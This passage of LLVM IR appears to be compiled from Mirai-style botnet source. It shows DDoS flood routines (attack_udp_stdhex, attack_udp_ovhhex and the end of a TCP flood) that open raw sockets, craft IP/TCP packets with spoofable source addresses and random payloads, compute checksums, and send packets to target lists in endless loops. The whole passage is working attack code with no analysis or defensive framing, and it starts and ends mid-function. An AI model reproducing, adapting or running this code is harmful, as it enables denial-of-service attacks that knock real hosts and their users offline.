  %29 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 14, i32 0)
  %30 = trunc i32 %29 to i16
  %31 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 15, i32 0)
  %32 = trunc i32 %31 to i16
  %33 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 16, i32 0)
  %34 = trunc i32 %33 to i16
  %35 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 512)
  %36 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 1, i32 1)
  %37 = trunc i32 %36 to i8
  %38 = load i32, i32* @LOCAL_ADDR, align 4
  %39 = tail call i32 @attack_get_opt_ip(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 25, i32 %38)
  %40 = tail call i32 @socket(i32 2, i32 3, i32 6) #10
  %41 = icmp eq i32 %40, -1
  br i1 %41, label %201, label %42

; <label>:42:                                     ; preds = %4
  store i32 1, i32* %5, align 4
  %43 = bitcast i32* %5 to i8*
  %44 = call i32 @setsockopt(i32 %40, i32 0, i32 3, i8* nonnull %43, i32 4) #10
  %45 = icmp eq i32 %44, -1
  br i1 %45, label %70, label %.preheader127

.preheader127:                                    ; preds = %42
  store i32 0, i32* %5, align 4
  %46 = zext i8 %0 to i32
  %47 = icmp eq i8 %0, 0
  br i1 %47, label %.preheader, label %.lr.ph129

.lr.ph129:                                        ; preds = %.preheader127
  %48 = trunc i32 %35 to i16
  %49 = add i16 %48, 40
  %50 = icmp eq i8 %16, 0
  %51 = trunc i32 %21 to i16
  %52 = shl i16 %24, 13
  %53 = and i16 %52, 8192
  %54 = shl i16 %26, 12
  %55 = and i16 %54, 4096
  %56 = and i8 %28, 1
  %57 = zext i8 %56 to i16
  %58 = shl nuw nsw i16 %57, 11
  %59 = shl i16 %30, 10
  %60 = and i16 %59, 1024
  %61 = shl i16 %32, 9
  %62 = and i16 %61, 512
  %63 = shl i16 %34, 8
  %64 = and i16 %63, 256
  %65 = or i16 %53, %55
  %66 = or i16 %65, %58
  %67 = or i16 %66, %60
  %.masked = or i16 %67, %62
  %68 = or i16 %.masked, %64
  %69 = icmp eq i8 %28, 0
  br label %88

; <label>:70:                                     ; preds = %42
  %71 = call i32 @close(i32 %40) #10
  br label %201

.preheader.loopexit:                              ; preds = %135
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.preheader127
  %72 = icmp eq i8 %0, 0
  %73 = icmp eq i32 %39, -1
  %74 = and i32 %11, 65535
  %75 = icmp eq i32 %74, 65535
  %76 = and i32 %17, 65535
  %77 = icmp eq i32 %76, 65535
  %78 = and i32 %19, 65535
  %79 = icmp eq i32 %78, 65535
  %80 = icmp eq i32 %21, 65535
  %81 = icmp eq i32 %22, 65535
  %82 = icmp eq i8 %37, 0
  %83 = sext i32 %35 to i64
  %84 = add nsw i64 %83, 20
  %85 = trunc i64 %84 to i16
  %86 = trunc i64 %84 to i32
  %87 = add nsw i64 %83, 40
  br label %.loopexit

; <label>:88:                                     ; preds = %.lr.ph129, %135
  %89 = call noalias i8* @calloc(i64 1510, i64 1) #10
  %90 = load i32, i32* %5, align 4
  %91 = sext i32 %90 to i64
  %92 = getelementptr inbounds i8*, i8** %8, i64 %91
  store i8* %89, i8** %92, align 8
  %93 = getelementptr inbounds i8, i8* %89, i64 20
  %94 = getelementptr inbounds i8, i8* %89, i64 40
  store i8 69, i8* %89, align 4
  %95 = getelementptr inbounds i8, i8* %89, i64 1
  store i8 %10, i8* %95, align 1
  %96 = call zeroext i16 @htons(i16 zeroext %49) #11
  %97 = getelementptr inbounds i8, i8* %89, i64 2
  %98 = bitcast i8* %97 to i16*
  store i16 %96, i16* %98, align 2
  %99 = call zeroext i16 @htons(i16 zeroext %12) #11
  %100 = getelementptr inbounds i8, i8* %89, i64 4
  %101 = bitcast i8* %100 to i16*
  store i16 %99, i16* %101, align 4
  %102 = getelementptr inbounds i8, i8* %89, i64 8
  store i8 %14, i8* %102, align 4
  br i1 %50, label %107, label %103

; <label>:103:                                    ; preds = %88
  %104 = call zeroext i16 @htons(i16 zeroext 16384) #11
  %105 = getelementptr inbounds i8, i8* %89, i64 6
  %106 = bitcast i8* %105 to i16*
  store i16 %104, i16* %106, align 2
  br label %107

; <label>:107:                                    ; preds = %88, %103
  %108 = getelementptr inbounds i8, i8* %89, i64 9
  store i8 6, i8* %108, align 1
  %109 = getelementptr inbounds i8, i8* %89, i64 12
  %110 = bitcast i8* %109 to i32*
  store i32 %39, i32* %110, align 4
  %111 = load i32, i32* %5, align 4
  %112 = sext i32 %111 to i64
  %113 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %112, i32 1
  %114 = load i32, i32* %113, align 4
  %115 = getelementptr inbounds i8, i8* %89, i64 16
  %116 = bitcast i8* %115 to i32*
  store i32 %114, i32* %116, align 4
  %117 = call zeroext i16 @htons(i16 zeroext %18) #11
  %118 = bitcast i8* %93 to i16*
  store i16 %117, i16* %118, align 4
  %119 = call zeroext i16 @htons(i16 zeroext %20) #11
  %120 = getelementptr inbounds i8, i8* %89, i64 22
  %121 = bitcast i8* %120 to i16*
  store i16 %119, i16* %121, align 2
  %122 = call zeroext i16 @htons(i16 zeroext %51) #11
  %123 = zext i16 %122 to i32
  %124 = getelementptr inbounds i8, i8* %89, i64 24
  %125 = bitcast i8* %124 to i32*
  store i32 %123, i32* %125, align 4
  %126 = getelementptr inbounds i8, i8* %89, i64 32
  %127 = bitcast i8* %126 to i16*
  %128 = load i16, i16* %127, align 4
  %129 = and i16 %128, -16369
  %130 = or i16 %68, %129
  %131 = or i16 %130, 80
  store i16 %131, i16* %127, align 4
  br i1 %69, label %135, label %132

; <label>:132:                                    ; preds = %107
  %133 = load i16, i16* %127, align 4
  %134 = or i16 %133, 2048
  store i16 %134, i16* %127, align 4
  br label %135

; <label>:135:                                    ; preds = %107, %132
  call void @rand_str(i8* nonnull %94, i32 %35)
  %136 = load i32, i32* %5, align 4
  %137 = add nsw i32 %136, 1
  store i32 %137, i32* %5, align 4
  %138 = icmp slt i32 %137, %46
  br i1 %138, label %88, label %.preheader.loopexit

.loopexit.loopexit:                               ; preds = %180
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %72, label %.loopexit.backedge, label %.lr.ph.preheader

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit
  br label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %180
  %storemerge121128 = phi i32 [ %199, %180 ], [ 0, %.lr.ph.preheader ]
  %139 = sext i32 %storemerge121128 to i64
  %140 = getelementptr inbounds i8*, i8** %8, i64 %139
  %141 = load i8*, i8** %140, align 8
  %142 = bitcast i8* %141 to %struct.iphdr*
  %143 = getelementptr inbounds i8, i8* %141, i64 20
  %144 = getelementptr inbounds i8, i8* %141, i64 40
  %145 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %139, i32 2
  %146 = load i8, i8* %145, align 4
  %147 = icmp ult i8 %146, 32
  br i1 %147, label %148, label %155

; <label>:148:                                    ; preds = %.lr.ph
  %149 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %139, i32 1
  %150 = load i32, i32* %149, align 4
  %151 = call i32 @ntohl(i32 %150) #11
  %152 = call i32 @htonl(i32 %151) #11
  %153 = getelementptr inbounds i8, i8* %141, i64 16
  %154 = bitcast i8* %153 to i32*
  store i32 %152, i32* %154, align 4
  br label %155

; <label>:155:                                    ; preds = %148, %.lr.ph
  br i1 %73, label %156, label %159

; <label>:156:                                    ; preds = %155
  %157 = getelementptr inbounds i8, i8* %141, i64 12
  %158 = bitcast i8* %157 to i32*
  store i32 0, i32* %158, align 4
  br label %159

; <label>:159:                                    ; preds = %156, %155
  br i1 %75, label %160, label %163

; <label>:160:                                    ; preds = %159
  %161 = getelementptr inbounds i8, i8* %141, i64 4
  %162 = bitcast i8* %161 to i16*
  store i16 0, i16* %162, align 4
  br label %163

; <label>:163:                                    ; preds = %160, %159
  br i1 %77, label %164, label %166

; <label>:164:                                    ; preds = %163
  %165 = bitcast i8* %143 to i16*
  store i16 0, i16* %165, align 4
  br label %166

; <label>:166:                                    ; preds = %164, %163
  br i1 %79, label %167, label %170

; <label>:167:                                    ; preds = %166
  %168 = getelementptr inbounds i8, i8* %141, i64 22
  %169 = bitcast i8* %168 to i16*
  store i16 0, i16* %169, align 2
  br label %170

; <label>:170:                                    ; preds = %167, %166
  br i1 %80, label %171, label %174

; <label>:171:                                    ; preds = %170
  %172 = getelementptr inbounds i8, i8* %141, i64 24
  %173 = bitcast i8* %172 to i32*
  store i32 0, i32* %173, align 4
  br label %174

; <label>:174:                                    ; preds = %171, %170
  br i1 %81, label %175, label %178

; <label>:175:                                    ; preds = %174
  %176 = getelementptr inbounds i8, i8* %141, i64 28
  %177 = bitcast i8* %176 to i32*
  store i32 0, i32* %177, align 4
  br label %178

; <label>:178:                                    ; preds = %175, %174
  br i1 %82, label %180, label %179

; <label>:179:                                    ; preds = %178
  call void @rand_str(i8* %144, i32 %35)
  br label %180

; <label>:180:                                    ; preds = %178, %179
  %181 = getelementptr inbounds i8, i8* %141, i64 10
  %182 = bitcast i8* %181 to i16*
  store i16 0, i16* %182, align 2
  %183 = bitcast i8* %141 to i16*
  %184 = call zeroext i16 @checksum_generic(i16* %183, i32 20)
  store i16 %184, i16* %182, align 2
  %185 = getelementptr inbounds i8, i8* %141, i64 36
  %186 = bitcast i8* %185 to i16*
  store i16 0, i16* %186, align 4
  %187 = call zeroext i16 @htons(i16 zeroext %85) #11
  %188 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %142, i8* %143, i16 zeroext %187, i32 %86)
  store i16 %188, i16* %186, align 4
  %189 = getelementptr inbounds i8, i8* %141, i64 22
  %190 = bitcast i8* %189 to i16*
  %191 = load i16, i16* %190, align 2
  %192 = load i32, i32* %5, align 4
  %193 = sext i32 %192 to i64
  %194 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %193, i32 0, i32 1
  store i16 %191, i16* %194, align 2
  %195 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %193, i32 0
  %196 = bitcast %struct.sockaddr_in* %195 to %struct.sockaddr*
  %197 = call i64 @sendto(i32 %40, i8* %141, i64 %87, i32 16384, %struct.sockaddr* %196, i32 16) #10
  %198 = load i32, i32* %5, align 4
  %199 = add nsw i32 %198, 1
  store i32 %199, i32* %5, align 4
  %200 = icmp slt i32 %199, %46
  br i1 %200, label %.lr.ph, label %.loopexit.loopexit

; <label>:201:                                    ; preds = %4, %70
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_stdhex(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #10
  %8 = bitcast i8* %7 to i8**
  %9 = tail call noalias i8* @calloc(i64 %6, i64 4) #10
  %10 = bitcast i8* %9 to i32*
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %14 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 1458)
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 1, i32 1)
  %16 = trunc i32 %15 to i8
  %17 = bitcast %struct.sockaddr_in* %5 to i8*
  call void @llvm.memset.p0i8.i64(i8* nonnull %17, i8 0, i64 16, i32 4, i1 false)
  %18 = and i32 %13, 65535
  %19 = icmp eq i32 %18, 65535
  br i1 %19, label %23, label %20

; <label>:20:                                     ; preds = %4
  %21 = trunc i32 %13 to i16
  %22 = tail call zeroext i16 @htons(i16 zeroext %21) #11
  br label %23

; <label>:23:                                     ; preds = %4, %20
  %.058 = phi i16 [ %22, %20 ], [ 0, %4 ]
  %24 = zext i8 %0 to i32
  %25 = icmp eq i8 %0, 0
  br i1 %25, label %.preheader, label %.lr.ph62

.lr.ph62:                                         ; preds = %23
  %26 = and i32 %11, 65535
  %27 = icmp eq i32 %26, 65535
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 0
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 1
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 2, i32 0
  %31 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %32 = zext i8 %0 to i64
  br label %35

.preheader.loopexit:                              ; preds = %60
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %23
  %33 = icmp ne i8 %0, 0
  %.mask = and i32 %14, 65535
  %34 = zext i32 %.mask to i64
  br label %.loopexit

; <label>:35:                                     ; preds = %.lr.ph62, %60
  %indvars.iv = phi i64 [ 0, %.lr.ph62 ], [ %indvars.iv.next, %60 ]
  %36 = call i32 @rand() #10
  %37 = call noalias i8* @calloc(i64 65535, i64 1) #10
  %38 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv
  store i8* %37, i8** %38, align 8
  br i1 %27, label %41, label %39

; <label>:39:                                     ; preds = %35
  %40 = call zeroext i16 @htons(i16 zeroext %12) #11
  br label %41

; <label>:41:                                     ; preds = %35, %39
  %.sink = phi i16 [ %40, %39 ], [ 0, %35 ]
  %42 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv
  %43 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 0, i32 1
  store i16 %.sink, i16* %43, align 2
  %44 = call i32 @socket(i32 2, i32 2, i32 0) #10
  %45 = getelementptr inbounds i32, i32* %10, i64 %indvars.iv
  store i32 %44, i32* %45, align 4
  %46 = icmp eq i32 %44, -1
  br i1 %46, label %47, label %48

; <label>:47:                                     ; preds = %41
  ret void

; <label>:48:                                     ; preds = %41
  store i16 2, i16* %28, align 4
  store i16 %.058, i16* %29, align 2
  store i32 0, i32* %30, align 4
  %49 = load i32, i32* %45, align 4
  %50 = call i32 @bind(i32 %49, %struct.sockaddr* nonnull %31, i32 16) #10
  %51 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 2
  %52 = load i8, i8* %51, align 4
  %53 = icmp ult i8 %52, 32
  br i1 %53, label %54, label %60

; <label>:54:                                     ; preds = %48
  %55 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 1
  %56 = load i32, i32* %55, align 4
  %57 = call i32 @ntohl(i32 %56) #11
  %58 = call i32 @htonl(i32 %57) #11
  %59 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 0, i32 2, i32 0
  store i32 %58, i32* %59, align 4
  br label %60

; <label>:60:                                     ; preds = %54, %48
  %61 = load i32, i32* %45, align 4
  %62 = bitcast %struct.attack_target* %42 to %struct.sockaddr*
  %63 = call i32 @connect(i32 %61, %struct.sockaddr* %62, i32 16) #10
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %64 = icmp slt i64 %indvars.iv.next, %32
  br i1 %64, label %35, label %.preheader.loopexit

.loopexit:                                        ; preds = %.loopexit, %.preheader
  br i1 %33, label %.lr.ph.preheader, label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  %65 = icmp eq i8 %16, 0
  %66 = and i32 %14, 65535
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %71
  %.160 = phi i32 [ %.mux, %71 ], [ 0, %.lr.ph.preheader ]
  %67 = sext i32 %.160 to i64
  %68 = getelementptr inbounds i8*, i8** %8, i64 %67
  %69 = load i8*, i8** %68, align 8
  br i1 %65, label %71, label %70

; <label>:70:                                     ; preds = %.lr.ph
  call void @rand_str(i8* %69, i32 %66)
  br label %71

; <label>:71:                                     ; preds = %.lr.ph, %70
  %72 = getelementptr inbounds i32, i32* %10, i64 %67
  %73 = load i32, i32* %72, align 4
  %74 = call i64 @send(i32 %73, i8* %69, i64 %34, i32 16384) #10
  %75 = add nsw i32 %.160, 1
  %76 = icmp slt i32 %75, %24
  %brmerge = or i1 %76, %33
  %.mux = select i1 %76, i32 %75, i32 0
  br i1 %brmerge, label %.lr.ph, label %infloop.preheader

infloop.preheader:                                ; preds = %71
  br label %infloop

infloop:                                          ; preds = %infloop.preheader, %infloop
  br label %infloop
}

; Function Attrs: nounwind
declare i32 @rand() local_unnamed_addr #1

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_ovhhex(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #10
  %8 = bitcast i8* %7 to i8**
  %9 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %10 = trunc i32 %9 to i8
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %14 = trunc i32 %13 to i8
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 1)
  %16 = trunc i32 %15 to i8
  %17 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %18 = trunc i32 %17 to i16
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %20 = trunc i32 %19 to i16
  %21 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 17, i32 65535)
  %22 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 18, i32 0)
  %23 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 11, i32 0)
  %24 = trunc i32 %23 to i8
  %25 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 12, i32 0)
  %26 = trunc i32 %25 to i16
  %27 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 13, i32 0)
  %28 = trunc i32 %27 to i16
  %29 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 14, i32 0)
  %30 = trunc i32 %29 to i16
  %31 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 15, i32 0)
  %32 = trunc i32 %31 to i16
  %33 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 16, i32 0)
  %34 = trunc i32 %33 to i16
  %35 = load i32, i32* @LOCAL_ADDR, align 4
  %36 = tail call i32 @attack_get_opt_ip(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 25, i32 %35)
  %37 = tail call i32 @socket(i32 2, i32 3, i32 6) #10
  %38 = icmp eq i32 %37, -1
  br i1 %38, label %200, label %39

; <label>:39:                                     ; preds = %4
  store i32 1, i32* %5, align 4
  %40 = bitcast i32* %5 to i8*
  %41 = call i32 @setsockopt(i32 %37, i32 0, i32 3, i8* nonnull %40, i32 4) #10
  %42 = icmp eq i32 %41, -1
  br i1 %42, label %64, label %.preheader128

.preheader128:                                    ; preds = %39
  store i32 0, i32* %5, align 4
  %43 = zext i8 %0 to i32
  %44 = icmp eq i8 %0, 0
  br i1 %44, label %.preheader, label %.lr.ph130

.lr.ph130:                                        ; preds = %.preheader128
  %45 = icmp eq i8 %16, 0
  %46 = trunc i32 %21 to i16
  %47 = and i8 %24, 1
  %48 = zext i8 %47 to i16
  %49 = shl nuw nsw i16 %48, 13
  %50 = shl i16 %26, 12
  %51 = and i16 %50, 4096
  %52 = shl i16 %28, 11
  %53 = and i16 %52, 2048
  %54 = shl i16 %30, 10
  %55 = and i16 %54, 1024
  %56 = shl i16 %32, 9
  %57 = and i16 %56, 512
  %58 = shl i16 %34, 8
  %59 = and i16 %58, 256
  %60 = or i16 %49, %51
  %61 = or i16 %60, %53
  %62 = or i16 %61, %55
  %.masked = or i16 %62, %57
  %63 = or i16 %.masked, %59
  br label %77

; <label>:64:                                     ; preds = %39
  %65 = call i32 @close(i32 %37) #10
  br label %200

.preheader.loopexit:                              ; preds = %97
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.preheader128
  %66 = icmp eq i8 %0, 0
  %67 = icmp eq i32 %36, -1
  %68 = and i32 %11, 65535
  %69 = icmp eq i32 %68, 65535
  %70 = and i32 %17, 65535
  %71 = icmp eq i32 %70, 65535
  %72 = and i32 %19, 65535
  %73 = icmp eq i32 %72, 65535
  %74 = icmp eq i32 %21, 65535
  %75 = icmp eq i32 %22, 65535
  %76 = icmp eq i8 %24, 0
  br label %.loopexit

; <label>:77:                                     ; preds = %.lr.ph130, %97
  %78 = call i32 @rand() #10
  %79 = call noalias i8* @calloc(i64 65535, i64 1) #10
  %80 = load i32, i32* %5, align 4
  %81 = sext i32 %80 to i64
  %82 = getelementptr inbounds i8*, i8** %8, i64 %81
  store i8* %79, i8** %82, align 8
  %83 = getelementptr inbounds i8, i8* %79, i64 20
  %84 = getelementptr inbounds i8, i8* %79, i64 40
  store i8 69, i8* %79, align 4
  %85 = getelementptr inbounds i8, i8* %79, i64 1
  store i8 %10, i8* %85, align 1
  %86 = call zeroext i16 @htons(i16 zeroext 60) #11
  %87 = getelementptr inbounds i8, i8* %79, i64 2
  %88 = bitcast i8* %87 to i16*
  store i16 %86, i16* %88, align 2
  %89 = call zeroext i16 @htons(i16 zeroext %12) #11
  %90 = getelementptr inbounds i8, i8* %79, i64 4
  %91 = bitcast i8* %90 to i16*
  store i16 %89, i16* %91, align 4
  %92 = getelementptr inbounds i8, i8* %79, i64 8
  store i8 %14, i8* %92, align 4
  br i1 %45, label %97, label %93

; <label>:93:                                     ; preds = %77
  %94 = call zeroext i16 @htons(i16 zeroext 16384) #11
  %95 = getelementptr inbounds i8, i8* %79, i64 6
  %96 = bitcast i8* %95 to i16*
  store i16 %94, i16* %96, align 2
  br label %97

; <label>:97:                                     ; preds = %77, %93
  %98 = getelementptr inbounds i8, i8* %79, i64 9
  store i8 6, i8* %98, align 1
  %99 = getelementptr inbounds i8, i8* %79, i64 12
  %100 = bitcast i8* %99 to i32*
  store i32 %36, i32* %100, align 4
  %101 = load i32, i32* %5, align 4
  %102 = sext i32 %101 to i64
  %103 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %102, i32 1
  %104 = load i32, i32* %103, align 4
  %105 = getelementptr inbounds i8, i8* %79, i64 16
  %106 = bitcast i8* %105 to i32*
  store i32 %104, i32* %106, align 4
  %107 = call zeroext i16 @htons(i16 zeroext %18) #11
  %108 = bitcast i8* %83 to i16*
  store i16 %107, i16* %108, align 4
  %109 = call zeroext i16 @htons(i16 zeroext %20) #11
  %110 = getelementptr inbounds i8, i8* %79, i64 22
  %111 = bitcast i8* %110 to i16*
  store i16 %109, i16* %111, align 2
  %112 = call zeroext i16 @htons(i16 zeroext %46) #11
  %113 = zext i16 %112 to i32
  %114 = getelementptr inbounds i8, i8* %79, i64 24
  %115 = bitcast i8* %114 to i32*
  store i32 %113, i32* %115, align 4
  %116 = getelementptr inbounds i8, i8* %79, i64 32
  %117 = bitcast i8* %116 to i16*
  %118 = load i16, i16* %117, align 4
  %119 = and i16 %118, -16369
  %120 = or i16 %63, %119
  %121 = or i16 %120, 160
  store i16 %121, i16* %117, align 4
  %122 = getelementptr inbounds i8, i8* %79, i64 41
  store i8 2, i8* %84, align 1
  %123 = getelementptr inbounds i8, i8* %79, i64 42
  store i8 4, i8* %122, align 1
  %124 = call zeroext i16 @htons(i16 zeroext 1400) #11
  %125 = bitcast i8* %123 to i16*
  store i16 %124, i16* %125, align 2
  %126 = getelementptr inbounds i8, i8* %79, i64 44
  %127 = getelementptr inbounds i8, i8* %79, i64 45
  store i8 4, i8* %126, align 1
  %128 = getelementptr inbounds i8, i8* %79, i64 46
  store i8 2, i8* %127, align 1
  %129 = getelementptr inbounds i8, i8* %79, i64 47
  store i8 8, i8* %128, align 1
  store i8 10, i8* %129, align 1
  %130 = getelementptr inbounds i8, i8* %79, i64 56
  %131 = getelementptr inbounds i8, i8* %79, i64 57
  store i8 1, i8* %130, align 1
  %132 = getelementptr inbounds i8, i8* %79, i64 58
  store i8 3, i8* %131, align 1
  %133 = getelementptr inbounds i8, i8* %79, i64 59
  store i8 3, i8* %132, align 1
  store i8 6, i8* %133, align 1
  %134 = load i32, i32* %5, align 4
  %135 = add nsw i32 %134, 1
  store i32 %135, i32* %5, align 4
  %136 = icmp slt i32 %135, %43
  br i1 %136, label %77, label %.preheader.loopexit

.loopexit.loopexit:                               ; preds = %179
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %66, label %.loopexit.backedge, label %.lr.ph.preheader

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit
  br label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %179
  %storemerge122129 = phi i32 [ %198, %179 ], [ 0, %.lr.ph.preheader ]
  %137 = sext i32 %storemerge122129 to i64
  %138 = getelementptr inbounds i8*, i8** %8, i64 %137
  %139 = load i8*, i8** %138, align 8
  %140 = bitcast i8* %139 to %struct.iphdr*
  %141 = getelementptr inbounds i8, i8* %139, i64 20
  %142 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %137, i32 2
  %143 = load i8, i8* %142, align 4
  %144 = icmp ult i8 %143, 32
  br i1 %144, label %145, label %152

; <label>:145:                                    ; preds = %.lr.ph
  %146 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %137, i32 1
  %147 = load i32, i32* %146, align 4
  %148 = call i32 @ntohl(i32 %147) #11
  %149 = call i32 @htonl(i32 %148) #11
  %150 = getelementptr inbounds i8, i8* %139, i64 16
  %151 = bitcast i8* %150 to i32*
  store i32 %149, i32* %151, align 4
  br label %152

; <label>:152:                                    ; preds = %145, %.lr.ph
  br i1 %67, label %153, label %156

; <label>:153:                                    ; preds = %152
  %154 = getelementptr inbounds i8, i8* %139, i64 12
  %155 = bitcast i8* %154 to i32*
  store i32 0, i32* %155, align 4
  br label %156

; <label>:156:                                    ; preds = %153, %152
  br i1 %69, label %157, label %160

; <label>:157:                                    ; preds = %156
  %158 = getelementptr inbounds i8, i8* %139, i64 4
  %159 = bitcast i8* %158 to i16*
  store i16 0, i16* %159, align 4
  br label %160

; <label>:160:                                    ; preds = %157, %156
  br i1 %71, label %161, label %163

; <label>:161:                                    ; preds = %160
  %162 = bitcast i8* %141 to i16*
  store i16 0, i16* %162, align 4
  br label %163

; <label>:163:                                    ; preds = %161, %160
  br i1 %73, label %164, label %167

; <label>:164:                                    ; preds = %163
  %165 = getelementptr inbounds i8, i8* %139, i64 22
  %166 = bitcast i8* %165 to i16*
  store i16 0, i16* %166, align 2
  br label %167

; <label>:167:                                    ; preds = %164, %163
  br i1 %74, label %168, label %171

; <label>:168:                                    ; preds = %167
  %169 = getelementptr inbounds i8, i8* %139, i64 24
  %170 = bitcast i8* %169 to i32*
  store i32 0, i32* %170, align 4
  br label %171

; <label>:171:                                    ; preds = %168, %167
  br i1 %75, label %172, label %175

; <label>:172:                                    ; preds = %171
  %173 = getelementptr inbounds i8, i8* %139, i64 28
  %174 = bitcast i8* %173 to i32*
  store i32 0, i32* %174, align 4
  br label %175

; <label>:175:                                    ; preds = %172, %171
  br i1 %76, label %179, label %176

; <label>:176:                                    ; preds = %175
  %177 = getelementptr inbounds i8, i8* %139, i64 38
  %178 = bitcast i8* %177 to i16*
  store i16 0, i16* %178, align 2
  br label %179

; <label>:179:                                    ; preds = %175, %176
  %180 = getelementptr inbounds i8, i8* %139, i64 10
  %181 = bitcast i8* %180 to i16*
  store i16 0, i16* %181, align 2
  %182 = bitcast i8* %139 to i16*
  %183 = call zeroext i16 @checksum_generic(i16* %182, i32 20)
  store i16 %183, i16* %181, align 2
  %184 = getelementptr inbounds i8, i8* %139, i64 36
  %185 = bitcast i8* %184 to i16*
  store i16 0, i16* %185, align 4
  %186 = call zeroext i16 @htons(i16 zeroext 40) #11
  %187 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %140, i8* %141, i16 zeroext %186, i32 40)
  store i16 %187, i16* %185, align 4
  %188 = getelementptr inbounds i8, i8* %139, i64 22
  %189 = bitcast i8* %188 to i16*
  %190 = load i16, i16* %189, align 2
  %191 = load i32, i32* %5, align 4
  %192 = sext i32 %191 to i64
  %193 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %192, i32 0, i32 1
  store i16 %190, i16* %193, align 2
